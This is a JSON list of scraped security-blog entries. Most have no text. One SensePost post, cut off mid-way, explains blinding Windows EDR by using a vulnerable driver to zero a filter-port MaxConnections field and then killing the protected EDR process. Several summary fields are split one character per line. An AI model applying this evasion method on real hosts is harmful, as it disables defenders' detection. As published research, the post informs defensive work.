{
    "brief": [
        "None   ...   ",
        "N\no\nn\ne\n \n \n \n.\n.\n.\n \n \n "
    ],
    "html_url": "https://blog.compass-security.com/2023/07/lenovo-update-your-privileges/",
    "text": null,
    "title": "Lenovo Update Your Privileges"
}
{
    "brief": [
        "None   ...   ",
        "N\no\nn\ne\n \n \n \n.\n.\n.\n \n \n "
    ],
    "html_url": "https://sensepost.com/blog/2023/p4wnp1-lte/",
    "text": null,
    "title": "P4wnP1-LTE"
}
{
    "brief": [
        "None   ...   ",
        "N\no\nn\ne\n \n \n \n.\n.\n.\n \n \n "
    ],
    "html_url": "https://blog.compass-security.com/2023/07/relaying-ntlm-to-mssql/",
    "text": null,
    "title": "Relaying NTLM to MSSQL"
}
{
    "brief": [
        "None   ...   ",
        "N\no\nn\ne\n \n \n \n.\n.\n.\n \n \n "
    ],
    "html_url": "https://sensepost.com/blog/2023/browsers-cache-smuggling/",
    "text": null,
    "title": "Browsers’ cache smuggling"
}
{
    "brief": [
        "None   ...   ",
        "N\no\nn\ne\n \n \n \n.\n.\n.\n \n \n "
    ],
    "html_url": "https://sensepost.com/blog/2023/orange-cyberdefense-at-hacker-summer-camp/",
    "text": null,
    "title": "Orange Cyberdefense at Hacker Summer Camp"
}
{
    "brief": [
        "None   ...   ",
        "N\no\nn\ne\n \n \n \n.\n.\n.\n \n \n "
    ],
    "html_url": "https://sensepost.com/blog/2023/select-from-projectdiscovery-join-steampipe/",
    "text": null,
    "title": "select * from projectdiscovery join steampipe"
}
{
    "brief": [
        "For example EDR_Driver.sys could subscribe to the “new process creation” notification service using the Windows API named PsSetCreateProcessNotifyRoutine which then, for each process created by the system, the driver will receive information about it (parent PID, command line, etc) The user double-clicks on malware.exe Windows calls the CreateProcessW API in order to load malware.exe into memory EDR_Driver.sys is notified that malware.exe **will be** spawned.   ...    A new process called malware.exe will be started soon.” EDR_process.exe can choose to take action (or not): “Ok I will monitor this process by creating hooks in its ntdll.dll” When malware.exe runs, it calls the Windows API.   ...    We could take the piece of code below from ired.team as an example of malware.exe.   ...    From Windows kernel memory space, EDR_Driver.sys could use several Windows Kernel API’s (callbacks) to monitor and then block the malicious system activities.   ...    Because we only focus on kernel part of EDR, here is a visualisation on what happens when you remove kernel callbacks:   ...    We won’t go into details on this topic, it’s covered in the blogpost Blinding EDR On Windows from Zach Stein.   ...    The first prerequisite for this step is to have a kernel-mode read / write primitive that we can use to set the value to 0.   ...    Let’s take a look at how we can get this address!   ...    This is a bit long for the middle of the blogpost, but if you’re curious and want to know how to do this using Windbg, check out the EXTRA MILE section at the end: “kernel walking, 10 steps to get access to MaxConnections”   ...    Personally I do this operation using a my own tool (unsigned evil driver) which allows us to kill a process even if it’s protected, but it’s also possible to use Process Hacker (if not denylisted) or even better any exploitable “process killer drivers”.   ...    Using this we can test if our “filter-mute technique” could be useful.   ...    (HR=0x%08X)\\n\", hr); if (hr == 0x800704D6) { printf(\"ERROR_CONNECTION_COUNT_LIMIT : A connection to the server could not be made because the limit on the number of concurrent connections for this account has been reached.\\n\"); } } // Other common errors you should check are // ERROR_BAD_PATHNAME (HR=0x800700A1) // E_FILE_NOT_FOUND (HR=0x80070002) // E_ACCESSDENIED (HR=0x80070005) // ERROR_INVALID_NAME (HR=0x8007007B) Static KDP: an EDR driver should call the MmProtectDriverSection API for protecting a section of its image Dynamic KDP: allows a driver to allocate and initialise read-only memory using services provided by a secure pool, which is managed by the secure kernel, using ExAllocatePool3 API.   ...    Want to know how to get MaxConnections value?   ...    The method below shows how to get the MaxConnections value of the driver named bindflt.sys using Windbg.   ...    You can get the address directly:   ...    Step 6 – compute the First filter address (Base of FLTMGR!_FLT_FILTER): 0xffffca0c386e8010   ...    kd> .formats poi(ffffca0c`3eaf7430)   ...    You got it!   ...    and   ...    kd> !process 0 0 MsMpEng.exe PROCESS ffffa40a23a5f340   ...    Because it was a nightmare for me to visualise where I am in kernel memory, what are the fields of the data structures, the links between data structures, what offsets should I use, etc I made the map below (which also includes Windbg commands).   ...   ",
        "F\no\nr\n \ne\nx\na\nm\np\nl\ne\n \nE\nD\nR\n_\nD\nr\ni\nv\ne\nr\n.\ns\ny\ns\n \nc\no\nu\nl\nd\n \ns\nu\nb\ns\nc\nr\ni\nb\ne\n \nt\no\n \nt\nh\ne\n \n“\nn\ne\nw\n \np\nr\no\nc\ne\ns\ns\n \nc\nr\ne\na\nt\ni\no\nn\n”\n \nn\no\nt\ni\nf\ni\nc\na\nt\ni\no\nn\n \ns\ne\nr\nv\ni\nc\ne\n \nu\ns\ni\nn\ng\n \nt\nh\ne\n \nW\ni\nn\nd\no\nw\ns\n \nA\nP\nI\n \nn\na\nm\ne\nd\n \nP\ns\nS\ne\nt\nC\nr\ne\na\nt\ne\nP\nr\no\nc\ne\ns\ns\nN\no\nt\ni\nf\ny\nR\no\nu\nt\ni\nn\ne\n \nw\nh\ni\nc\nh\n \nt\nh\ne\nn\n,\n \nf\no\nr\n \ne\na\nc\nh\n \np\nr\no\nc\ne\ns\ns\n \nc\nr\ne\na\nt\ne\nd\n \nb\ny\n \nt\nh\ne\n \ns\ny\ns\nt\ne\nm\n,\n \nt\nh\ne\n \nd\nr\ni\nv\ne\nr\n \nw\ni\nl\nl\n \nr\ne\nc\ne\ni\nv\ne\n \ni\nn\nf\no\nr\nm\na\nt\ni\no\nn\n \na\nb\no\nu\nt\n \ni\nt\n \n(\np\na\nr\ne\nn\nt\n \nP\nI\nD\n,\n \nc\no\nm\nm\na\nn\nd\n \nl\ni\nn\ne\n,\n \ne\nt\nc\n)\n \nT\nh\ne\n \nu\ns\ne\nr\n \nd\no\nu\nb\nl\ne\n-\nc\nl\ni\nc\nk\ns\n \no\nn\n \nm\na\nl\nw\na\nr\ne\n.\ne\nx\ne\n \nW\ni\nn\nd\no\nw\ns\n \nc\na\nl\nl\ns\n \nt\nh\ne\n \nC\nr\ne\na\nt\ne\nP\nr\no\nc\ne\ns\ns\nW\n \nA\nP\nI\n \ni\nn\n \no\nr\nd\ne\nr\n \nt\no\n \nl\no\na\nd\n \nm\na\nl\nw\na\nr\ne\n.\ne\nx\ne\n \ni\nn\nt\no\n \nm\ne\nm\no\nr\ny\n \nE\nD\nR\n_\nD\nr\ni\nv\ne\nr\n.\ns\ny\ns\n \ni\ns\n \nn\no\nt\ni\nf\ni\ne\nd\n \nt\nh\na\nt\n \nm\na\nl\nw\na\nr\ne\n.\ne\nx\ne\n \n*\n*\nw\ni\nl\nl\n \nb\ne\n*\n*\n \ns\np\na\nw\nn\ne\nd\n.\n \n \n \n.\n.\n.\n \n \n \n \nA\n \nn\ne\nw\n \np\nr\no\nc\ne\ns\ns\n \nc\na\nl\nl\ne\nd\n \nm\na\nl\nw\na\nr\ne\n.\ne\nx\ne\n \nw\ni\nl\nl\n \nb\ne\n \ns\nt\na\nr\nt\ne\nd\n \ns\no\no\nn\n.\n”\n \nE\nD\nR\n_\np\nr\no\nc\ne\ns\ns\n.\ne\nx\ne\n \nc\na\nn\n \nc\nh\no\no\ns\ne\n \nt\no\n \nt\na\nk\ne\n \na\nc\nt\ni\no\nn\n \n(\no\nr\n \nn\no\nt\n)\n:\n \n“\nO\nk\n \nI\n \nw\ni\nl\nl\n \nm\no\nn\ni\nt\no\nr\n \nt\nh\ni\ns\n \np\nr\no\nc\ne\ns\ns\n \nb\ny\n \nc\nr\ne\na\nt\ni\nn\ng\n \nh\no\no\nk\ns\n \ni\nn\n \ni\nt\ns\n \nn\nt\nd\nl\nl\n.\nd\nl\nl\n”\n \nW\nh\ne\nn\n \nm\na\nl\nw\na\nr\ne\n.\ne\nx\ne\n \nr\nu\nn\ns\n,\n \ni\nt\n \nc\na\nl\nl\ns\n \nt\nh\ne\n \nW\ni\nn\nd\no\nw\ns\n \nA\nP\nI\n.\n \n \n \n.\n.\n.\n \n \n \n \nW\ne\n \nc\no\nu\nl\nd\n \nt\na\nk\ne\n \nt\nh\ne\n \np\ni\ne\nc\ne\n \no\nf\n \nc\no\nd\ne\n \nb\ne\nl\no\nw\n \nf\nr\no\nm\n \ni\nr\ne\nd\n.\nt\ne\na\nm\n \na\ns\n \na\nn\n \ne\nx\na\nm\np\nl\ne\n \no\nf\n \nm\na\nl\nw\na\nr\ne\n.\ne\nx\ne\n.\n \n \n \n.\n.\n.\n \n \n \n \nF\nr\no\nm\n \nW\ni\nn\nd\no\nw\ns\n \nk\ne\nr\nn\ne\nl\n \nm\ne\nm\no\nr\ny\n \ns\np\na\nc\ne\n,\n \nE\nD\nR\n_\nD\nr\ni\nv\ne\nr\n.\ns\ny\ns\n \nc\no\nu\nl\nd\n \nu\ns\ne\n \ns\ne\nv\ne\nr\na\nl\n \nW\ni\nn\nd\no\nw\ns\n \nK\ne\nr\nn\ne\nl\n \nA\nP\nI\n’\ns\n \n(\nc\na\nl\nl\nb\na\nc\nk\ns\n)\n \nt\no\n \nm\no\nn\ni\nt\no\nr\n \na\nn\nd\n \nt\nh\ne\nn\n \nb\nl\no\nc\nk\n \nt\nh\ne\n \nm\na\nl\ni\nc\ni\no\nu\ns\n \ns\ny\ns\nt\ne\nm\n \na\nc\nt\ni\nv\ni\nt\ni\ne\ns\n.\n \n \n \n.\n.\n.\n \n \n \n \nB\ne\nc\na\nu\ns\ne\n \nw\ne\n \no\nn\nl\ny\n \nf\no\nc\nu\ns\n \no\nn\n \nk\ne\nr\nn\ne\nl\n \np\na\nr\nt\n \no\nf\n \nE\nD\nR\n,\n \nh\ne\nr\ne\n \ni\ns\n \na\n \nv\ni\ns\nu\na\nl\ni\ns\na\nt\ni\no\nn\n \no\nn\n \nw\nh\na\nt\n \nh\na\np\np\ne\nn\ns\n \nw\nh\ne\nn\n \ny\no\nu\n \nr\ne\nm\no\nv\ne\n \nk\ne\nr\nn\ne\nl\n \nc\na\nl\nl\nb\na\nc\nk\ns\n:\n \n \n \n.\n.\n.\n \n \n \n \nW\ne\n \nw\no\nn\n’\nt\n \ng\no\n \ni\nn\nt\no\n \nd\ne\nt\na\ni\nl\ns\n \no\nn\n \nt\nh\ni\ns\n \nt\no\np\ni\nc\n,\n \ni\nt\n’\ns\n \nc\no\nv\ne\nr\ne\nd\n \ni\nn\n \nt\nh\ne\n \nb\nl\no\ng\np\no\ns\nt\n \nB\nl\ni\nn\nd\ni\nn\ng\n \nE\nD\nR\n \nO\nn\n \nW\ni\nn\nd\no\nw\ns\n \nf\nr\no\nm\n \nZ\na\nc\nh\n \nS\nt\ne\ni\nn\n.\n \n \n \n.\n.\n.\n \n \n \n \nT\nh\ne\n \nf\ni\nr\ns\nt\n \np\nr\ne\nr\ne\nq\nu\ni\ns\ni\nt\ne\n \nf\no\nr\n \nt\nh\ni\ns\n \ns\nt\ne\np\n \ni\ns\n \nt\no\n \nh\na\nv\ne\n \na\n \nk\ne\nr\nn\ne\nl\n-\nm\no\nd\ne\n \nr\ne\na\nd\n \n/\n \nw\nr\ni\nt\ne\n \np\nr\ni\nm\ni\nt\ni\nv\ne\n \nt\nh\na\nt\n \nw\ne\n \nc\na\nn\n \nu\ns\ne\n \nt\no\n \ns\ne\nt\n \nt\nh\ne\n \nv\na\nl\nu\ne\n \nt\no\n \n0\n.\n \n \n \n.\n.\n.\n \n \n \n \nL\ne\nt\n’\ns\n \nt\na\nk\ne\n \na\n \nl\no\no\nk\n \na\nt\n \nh\no\nw\n \nw\ne\n \nc\na\nn\n \ng\ne\nt\n \nt\nh\ni\ns\n \na\nd\nd\nr\ne\ns\ns\n!\n \n \n \n.\n.\n.\n \n \n \n \nT\nh\ni\ns\n \ni\ns\n \na\n \nb\ni\nt\n \nl\no\nn\ng\n \nf\no\nr\n \nt\nh\ne\n \nm\ni\nd\nd\nl\ne\n \no\nf\n \nt\nh\ne\n \nb\nl\no\ng\np\no\ns\nt\n,\n \nb\nu\nt\n \ni\nf\n \ny\no\nu\n’\nr\ne\n \nc\nu\nr\ni\no\nu\ns\n \na\nn\nd\n \nw\na\nn\nt\n \nt\no\n \nk\nn\no\nw\n \nh\no\nw\n \nt\no\n \nd\no\n \nt\nh\ni\ns\n \nu\ns\ni\nn\ng\n \nW\ni\nn\nd\nb\ng\n,\n \nc\nh\ne\nc\nk\n \no\nu\nt\n \nt\nh\ne\n \nE\nX\nT\nR\nA\n \nM\nI\nL\nE\n \ns\ne\nc\nt\ni\no\nn\n \na\nt\n \nt\nh\ne\n \ne\nn\nd\n:\n \n“\nk\ne\nr\nn\ne\nl\n \nw\na\nl\nk\ni\nn\ng\n,\n \n1\n0\n \ns\nt\ne\np\ns\n \nt\no\n \ng\ne\nt\n \na\nc\nc\ne\ns\ns\n \nt\no\n \nM\na\nx\nC\no\nn\nn\ne\nc\nt\ni\no\nn\ns\n”\n \n \n \n.\n.\n.\n \n \n \n \nP\ne\nr\ns\no\nn\na\nl\nl\ny\n \nI\n \nd\no\n \nt\nh\ni\ns\n \no\np\ne\nr\na\nt\ni\no\nn\n \nu\ns\ni\nn\ng\n \na\n \nm\ny\n \no\nw\nn\n \nt\no\no\nl\n \n(\nu\nn\ns\ni\ng\nn\ne\nd\n \ne\nv\ni\nl\n \nd\nr\ni\nv\ne\nr\n)\n \nw\nh\ni\nc\nh\n \na\nl\nl\no\nw\ns\n \nu\ns\n \nt\no\n \nk\ni\nl\nl\n \na\n \np\nr\no\nc\ne\ns\ns\n \ne\nv\ne\nn\n \ni\nf\n \ni\nt\n’\ns\n \np\nr\no\nt\ne\nc\nt\ne\nd\n,\n \nb\nu\nt\n \ni\nt\n’\ns\n \na\nl\ns\no\n \np\no\ns\ns\ni\nb\nl\ne\n \nt\no\n \nu\ns\ne\n \nP\nr\no\nc\ne\ns\ns\n \nH\na\nc\nk\ne\nr\n \n(\ni\nf\n \nn\no\nt\n \nd\ne\nn\ny\nl\ni\ns\nt\ne\nd\n)\n \no\nr\n \ne\nv\ne\nn\n \nb\ne\nt\nt\ne\nr\n \na\nn\ny\n \ne\nx\np\nl\no\ni\nt\na\nb\nl\ne\n \n“\np\nr\no\nc\ne\ns\ns\n \nk\ni\nl\nl\ne\nr\n \nd\nr\ni\nv\ne\nr\ns\n”\n.\n \n \n \n.\n.\n.\n \n \n \n \nU\ns\ni\nn\ng\n \nt\nh\ni\ns\n \nw\ne\n \nc\na\nn\n \nt\ne\ns\nt\n \ni\nf\n \no\nu\nr\n \n“\nf\ni\nl\nt\ne\nr\n-\nm\nu\nt\ne\n \nt\ne\nc\nh\nn\ni\nq\nu\ne\n”\n \nc\no\nu\nl\nd\n \nb\ne\n \nu\ns\ne\nf\nu\nl\n.\n \n \n \n.\n.\n.\n \n \n \n \n(\nH\nR\n=\n0\nx\n%\n0\n8\nX\n)\n\\\nn\n\"\n,\n \nh\nr\n)\n;\n \ni\nf\n \n(\nh\nr\n \n=\n=\n \n0\nx\n8\n0\n0\n7\n0\n4\nD\n6\n)\n \n{\n \np\nr\ni\nn\nt\nf\n(\n\"\nE\nR\nR\nO\nR\n_\nC\nO\nN\nN\nE\nC\nT\nI\nO\nN\n_\nC\nO\nU\nN\nT\n_\nL\nI\nM\nI\nT\n \n:\n \nA\n \nc\no\nn\nn\ne\nc\nt\ni\no\nn\n \nt\no\n \nt\nh\ne\n \ns\ne\nr\nv\ne\nr\n \nc\no\nu\nl\nd\n \nn\no\nt\n \nb\ne\n \nm\na\nd\ne\n \nb\ne\nc\na\nu\ns\ne\n \nt\nh\ne\n \nl\ni\nm\ni\nt\n \no\nn\n \nt\nh\ne\n \nn\nu\nm\nb\ne\nr\n \no\nf\n \nc\no\nn\nc\nu\nr\nr\ne\nn\nt\n \nc\no\nn\nn\ne\nc\nt\ni\no\nn\ns\n \nf\no\nr\n \nt\nh\ni\ns\n \na\nc\nc\no\nu\nn\nt\n \nh\na\ns\n \nb\ne\ne\nn\n \nr\ne\na\nc\nh\ne\nd\n.\n\\\nn\n\"\n)\n;\n \n}\n \n}\n \n/\n/\n \nO\nt\nh\ne\nr\n \nc\no\nm\nm\no\nn\n \ne\nr\nr\no\nr\ns\n \ny\no\nu\n \ns\nh\no\nu\nl\nd\n \nc\nh\ne\nc\nk\n \na\nr\ne\n \n/\n/\n \nE\nR\nR\nO\nR\n_\nB\nA\nD\n_\nP\nA\nT\nH\nN\nA\nM\nE\n \n(\nH\nR\n=\n0\nx\n8\n0\n0\n7\n0\n0\nA\n1\n)\n \n/\n/\n \nE\n_\nF\nI\nL\nE\n_\nN\nO\nT\n_\nF\nO\nU\nN\nD\n \n(\nH\nR\n=\n0\nx\n8\n0\n0\n7\n0\n0\n0\n2\n)\n \n/\n/\n \nE\n_\nA\nC\nC\nE\nS\nS\nD\nE\nN\nI\nE\nD\n \n(\nH\nR\n=\n0\nx\n8\n0\n0\n7\n0\n0\n0\n5\n)\n \n/\n/\n \nE\nR\nR\nO\nR\n_\nI\nN\nV\nA\nL\nI\nD\n_\nN\nA\nM\nE\n \n(\nH\nR\n=\n0\nx\n8\n0\n0\n7\n0\n0\n7\nB\n)\n \nS\nt\na\nt\ni\nc\n \nK\nD\nP\n:\n \na\nn\n \nE\nD\nR\n \nd\nr\ni\nv\ne\nr\n \ns\nh\no\nu\nl\nd\n \nc\na\nl\nl\n \nt\nh\ne\n \nM\nm\nP\nr\no\nt\ne\nc\nt\nD\nr\ni\nv\ne\nr\nS\ne\nc\nt\ni\no\nn\n \nA\nP\nI\n \nf\no\nr\n \np\nr\no\nt\ne\nc\nt\ni\nn\ng\n \na\n \ns\ne\nc\nt\ni\no\nn\n \no\nf\n \ni\nt\ns\n \ni\nm\na\ng\ne\n \nD\ny\nn\na\nm\ni\nc\n \nK\nD\nP\n:\n \na\nl\nl\no\nw\ns\n \na\n \nd\nr\ni\nv\ne\nr\n \nt\no\n \na\nl\nl\no\nc\na\nt\ne\n \na\nn\nd\n \ni\nn\ni\nt\ni\na\nl\ni\ns\ne\n \nr\ne\na\nd\n-\no\nn\nl\ny\n \nm\ne\nm\no\nr\ny\n \nu\ns\ni\nn\ng\n \ns\ne\nr\nv\ni\nc\ne\ns\n \np\nr\no\nv\ni\nd\ne\nd\n \nb\ny\n \na\n \ns\ne\nc\nu\nr\ne\n \np\no\no\nl\n,\n \nw\nh\ni\nc\nh\n \ni\ns\n \nm\na\nn\na\ng\ne\nd\n \nb\ny\n \nt\nh\ne\n \ns\ne\nc\nu\nr\ne\n \nk\ne\nr\nn\ne\nl\n,\n \nu\ns\ni\nn\ng\n \nE\nx\nA\nl\nl\no\nc\na\nt\ne\nP\no\no\nl\n3\n \nA\nP\nI\n.\n \n \n \n.\n.\n.\n \n \n \n \nW\na\nn\nt\n \nt\no\n \nk\nn\no\nw\n \nh\no\nw\n \nt\no\n \ng\ne\nt\n \nM\na\nx\nC\no\nn\nn\ne\nc\nt\ni\no\nn\ns\n \nv\na\nl\nu\ne\n?\n \n \n \n.\n.\n.\n \n \n \n \nT\nh\ne\n \nm\ne\nt\nh\no\nd\n \nb\ne\nl\no\nw\n \ns\nh\no\nw\ns\n \nh\no\nw\n \nt\no\n \ng\ne\nt\n \nt\nh\ne\n \nM\na\nx\nC\no\nn\nn\ne\nc\nt\ni\no\nn\ns\n \nv\na\nl\nu\ne\n \no\nf\n \nt\nh\ne\n \nd\nr\ni\nv\ne\nr\n \nn\na\nm\ne\nd\n \nb\ni\nn\nd\nf\nl\nt\n.\ns\ny\ns\n \nu\ns\ni\nn\ng\n \nW\ni\nn\nd\nb\ng\n.\n \n \n \n.\n.\n.\n \n \n \n \nY\no\nu\n \nc\na\nn\n \ng\ne\nt\n \nt\nh\ne\n \na\nd\nd\nr\ne\ns\ns\n \nd\ni\nr\ne\nc\nt\nl\ny\n:\n \n \n \n.\n.\n.\n \n \n \n \nS\nt\ne\np\n \n6\n \n–\n \nc\no\nm\np\nu\nt\ne\n \nt\nh\ne\n \nF\ni\nr\ns\nt\n \nf\ni\nl\nt\ne\nr\n \na\nd\nd\nr\ne\ns\ns\n \n(\nB\na\ns\ne\n \no\nf\n \nF\nL\nT\nM\nG\nR\n!\n_\nF\nL\nT\n_\nF\nI\nL\nT\nE\nR\n)\n:\n \n0\nx\nf\nf\nf\nf\nc\na\n0\nc\n3\n8\n6\ne\n8\n0\n1\n0\n \n \n \n.\n.\n.\n \n \n \n \nk\nd\n>\n \n.\nf\no\nr\nm\na\nt\ns\n \np\no\ni\n(\nf\nf\nf\nf\nc\na\n0\nc\n`\n3\ne\na\nf\n7\n4\n3\n0\n)\n \n \n \n.\n.\n.\n \n \n \n \nY\no\nu\n \ng\no\nt\n \ni\nt\n!\n \n \n \n.\n.\n.\n \n \n \n \na\nn\nd\n \n \n \n.\n.\n.\n \n \n \n \nk\nd\n>\n \n!\np\nr\no\nc\ne\ns\ns\n \n0\n \n0\n \nM\ns\nM\np\nE\nn\ng\n.\ne\nx\ne\n \nP\nR\nO\nC\nE\nS\nS\n \nf\nf\nf\nf\na\n4\n0\na\n2\n3\na\n5\nf\n3\n4\n0\n \n \n \n.\n.\n.\n \n \n \n \nB\ne\nc\na\nu\ns\ne\n \ni\nt\n \nw\na\ns\n \na\n \nn\ni\ng\nh\nt\nm\na\nr\ne\n \nf\no\nr\n \nm\ne\n \nt\no\n \nv\ni\ns\nu\na\nl\ni\ns\ne\n \nw\nh\ne\nr\ne\n \nI\n \na\nm\n \ni\nn\n \nk\ne\nr\nn\ne\nl\n \nm\ne\nm\no\nr\ny\n,\n \nw\nh\na\nt\n \na\nr\ne\n \nt\nh\ne\n \nf\ni\ne\nl\nd\ns\n \no\nf\n \nt\nh\ne\n \nd\na\nt\na\n \ns\nt\nr\nu\nc\nt\nu\nr\ne\ns\n,\n \nt\nh\ne\n \nl\ni\nn\nk\ns\n \nb\ne\nt\nw\ne\ne\nn\n \nd\na\nt\na\n \ns\nt\nr\nu\nc\nt\nu\nr\ne\ns\n,\n \nw\nh\na\nt\n \no\nf\nf\ns\ne\nt\ns\n \ns\nh\no\nu\nl\nd\n \nI\n \nu\ns\ne\n,\n \ne\nt\nc\n \nI\n \nm\na\nd\ne\n \nt\nh\ne\n \nm\na\np\n \nb\ne\nl\no\nw\n \n(\nw\nh\ni\nc\nh\n \na\nl\ns\no\n \ni\nn\nc\nl\nu\nd\ne\ns\n \nW\ni\nn\nd\nb\ng\n \nc\no\nm\nm\na\nn\nd\ns\n)\n.\n \n \n \n.\n.\n.\n \n \n "
    ],
    "html_url": "https://sensepost.com/blog/2023/filter-mute-operation-investigating-edr-internal-communication/",
    "text": "For our annual internal hacker conference dubbed SenseCon in 2023, I decided to take a look at communication between a Windows driver and its user-mode process. Here are some details about that journey.\n\nTL;DR\n\nAttackers could use Windows kernel R/W exploit primitive to avoid communication between EDR_Driver.sys and its EDR_process.exe. As a result some EDR detection mechanisms will be disabled and make it (partially) blind to malicious payloads. This blogpost describes an alternative approach which doesn’t remove kernel callbacks and gives some recommendations for protecting against this “filter-mute” attack.\n\nOverview of EDR_process.exe and EDR_Driver.sys roles\n\nThe first question that comes to mind is how does a EDR application (EDR_Process.exe) communicate with its EDR driver (EDR_Driver.sys)?\n\nBefore doing research we must know some EDR basics; how does an EDR agent hook / inject its own DLL during process creation?\n\nThe Process Injection via Callbacks schemas taken from EDR Observations made by Christopher Vella is a good summary.\n\nI have added some comments on what’s happening:\n\nEDR_Driver.sys can subscribe to several kinds of kernel notifications. You can imagine those notifications are like “newsletters” you subscribe to on the Internet and receive by email from a website. For example EDR_Driver.sys could subscribe to the “new process creation” notification service using the Windows API named PsSetCreateProcessNotifyRoutine which then, for each process created by the system, the driver will receive information about it (parent PID, command line, etc)\nThe user double-clicks on malware.exe\nWindows calls the CreateProcessW API in order to load malware.exe into memory\nEDR_Driver.sys is notified that malware.exe **will be** spawned.\nEDR_Driver.sys sends a log to EDR_Process.exe saying “Hey! A new process called malware.exe will be started soon.”\nEDR_process.exe can choose to take action (or not): “Ok I will monitor this process by creating hooks in its ntdll.dll”\nWhen malware.exe runs, it calls the Windows API. Thanks to the hooks in place, EDR_Process.exe knows which APIs are called and can deduce what this malware.exe is doing\n\nWe could take the piece of code below from ired.team as an example of malware.exe.\n\nOnce hooks are in place, the EDR agent (EDR_process.exe) can monitor / analyse malware.exe. Here is an example of actions it could take:\n\n1. EDR_Process.exe sees the following Windows API calls that are called by malware.exe:\n\nOpenProcess\nVirtualAllocEx\nWriteProcessMemory\nCreateRemoteThread\n\n2. EDR_Process.exe classifies this API call sequence as “malicious” and blocks (kills) the process.\n\n3. EDR_Process.exe sends a log to the EDR_C2 (security console) saying “Hey, malware.exe process spawned and is classified as malicious”.\n\nNote: this is a common EDR flow and not the only way it could work, for example EDR_Process.exe may only send telemetry data and let the EDR_C2 decide if it’s malicious and the action to be applied (block or not).\n\nIf the EDR vendor or the security team operators (aka blueteam) configured a “block if malicious” rule in the EDR Security Console then the malware.exe process is killed by EDR_Process.exe (or EDR_Driver.sys). Other countermeasures are also available, for example:\n\nthe Windows host could be remotely isolated from the network\nmalware.exe file or memory dump could be downloaded for analysis / reversing\nsecurity analyst could run commands on the Windows host (from the security console) for investigation purpose\n…\n\nThis point is an important one; the more experienced the blueteam is in creating custom rules, the more difficult for attackers to evade or move laterally into the network without being caught!\n\nNow before digging into internal communication, I want to take a step back and simplify the EDR behaviour. Internal communication (blue arrows) and external communication (yellow arrows) of the EDR_Process.exe could be visualised with a simple overview:\n\nDigging into EDR internal communication\n\nFrom Windows kernel memory space, EDR_Driver.sys could use several Windows Kernel API’s (callbacks) to monitor and then block the malicious system activities. For example the API PsSetCreateProcessNotifyRoutine routine could be used to generate the following “monitoring logs” messages thanks to the kernel callback mechanism:\n\n– Log = new process created (PID 5376) with cmd Line C:\\notepad.exe\n\nFrom usermode memory space, EDR_Process.exe could send action requests to the driver and receive information from it. For example an “Action request” coming from EDR security console could be:\n\n– Action = denylist C:\\notepad.exe\n\nIn the figure below I tried to map common Windows Kernel callbacks used for monitoring purposes.\n\nThe question which comes to mind after making this summary was how to avoid communication between EDR_process.exe and EDR_driver.sys?\n\nBlinding EDR using known techniques\n\nThe most common techniques for blinding EDR sensors are:\n\nRemoving the DLL hooks (userland)\nRemoving the kernel callbacks (kernel land)\n\nBecause we only focus on kernel part of EDR, here is a visualisation on what happens when you remove kernel callbacks:\n\nBEFORE zero out of the EDR callback address:\n\nAFTER zero out of the EDR callback address:\n\nWe won’t go into details on this topic, it’s covered in the blogpost Blinding EDR On Windows from Zach Stein.\n\nBut you may notice in the figure below that each time you zero out the EDR callback address it means no more notifications (no “newsletter”) will be sent from Windows to EDR_Driver.sys. In the end, no event log will be sent to EDR_Process.exe (and security analyst console) anymore!\n\nBlinding EDR using an alternative approach\n\nDuring my research on this topic I was wondering how to avoid communication between EDR_process.exe and EDR_driver.sys without any callback modification ? Could we prevent EDR_process.exe and EDR_Driver.sys from exchanging “messages”?\n\nLike I said before, we want to stay on the kernel side of the story. We could imagine this other approach using this graphical representation:\n\nWhile I was trying to investigate using Windbg, Yarden Shafir wrote an awesome blog on Investigating Filter Communication Ports which really helped. I discovered some Windows data structures being manipulated during communication setup between an application and a driver.\n\nThe data structure named FLT_SERVER_PORT_OBJECT drew my attention because it seemed to contain interesting fields, see if you agree:\n\nWhen I saw this, the first question which came to my mind was what could happen if we set MaxConnections to zero?\n\nThis data structure is initialised using the Windows Drivers API named FltCreateCommunicationPort:\n\nNTSTATUS FLTAPI FltCreateCommunicationPort(\n  [in]           PFLT_FILTER            Filter,\n  [out]          PFLT_PORT              *ServerPort,\n  [in]           POBJECT_ATTRIBUTES     ObjectAttributes,\n  [in, optional] PVOID                  ServerPortCookie,\n  [in]           PFLT_CONNECT_NOTIFY    ConnectNotifyCallback,\n  [in]           PFLT_DISCONNECT_NOTIFY DisconnectNotifyCallback,\n  [in, optional] PFLT_MESSAGE_NOTIFY    MessageNotifyCallback,\n  [in]           LONG                   MaxConnections\n);\n\nMicrosoft documentation gives the following information:\n\nWhat could we deduce? If we are able to reset MaxConnections to zero, it will only prevent new connections from happening. Let’s go for the following attack plan:\n\nStep 1: reset MaxConnections value\nStep 2: force EDR_Process.exe to restart (should require high privileges, probably NT SYSTEM)\nStep 3: observe EDR behaviour\nStep 1: reset MaxConnections value\n\nThe first prerequisite for this step is to have a kernel-mode read / write primitive that we can use to set the value to 0. We will use BYOVD (Bring Your Own Vulnerable Driver) technique for this. As a second prerequisite we have to find the address of MaxConnections field in kernel memory right? Let’s take a look at how we can get this address!\n\nThe structure fltmgr!_FLT_SERVER_PORT_OBJECT we discussed previously could be reached by the structure fltmgr!_FLT_FILTER, which could be reached by the structure fltmgr!_FLTP_FRAME, which could be reached by the structure FLTMGR!_GLOBALS, which could be reached by the FltMgr.sys driver. The base address of this kernel module can be retrieved from userland using NtQuerySystemInformation Windows API.\n\nI agree with Alex Ionescu when he said “I got 99 problems but a kernel pointer ain’t one” :-). We can find MaxConnections address by walking through Windows kernel data structures, starting from FltMgr.sys driver up to this field!\n\nThis is a bit long for the middle of the blogpost, but if you’re curious and want to know how to do this using Windbg, check out the EXTRA MILE section at the end: “kernel walking, 10 steps to get access to MaxConnections”\n\nHere is what it looks like when you want to have a look at details concerning Windows Defender kernel driver:\n\nWith knowledge of the MaxConnections memory location, we can use a kernel-mode read primitive to get the current value, and using a kernel-mode write primitive we can set the value to 0.\n\nStep 2: force EDR to restart\n\nThis phase could be difficult because EDR_Process.exe does its utmost to protect itself. Usually this program is started as a service and it will respawn after it dies but we don’t care since no connection is allowed by EDR_Driver.sys thanks to step 1 ;-)\n\nPersonally I do this operation using a my own tool (unsigned evil driver) which allows us to kill a process even if it’s protected, but it’s also possible to use Process Hacker (if not denylisted) or even better any exploitable “process killer drivers”. I highly recommend the blogpost by Alice Climent-Pommeret (@AliceCliment) Finding and exploiting process killer drivers with LOL for 3000$ which covers this topic!\n\nStep 3: observe EDR 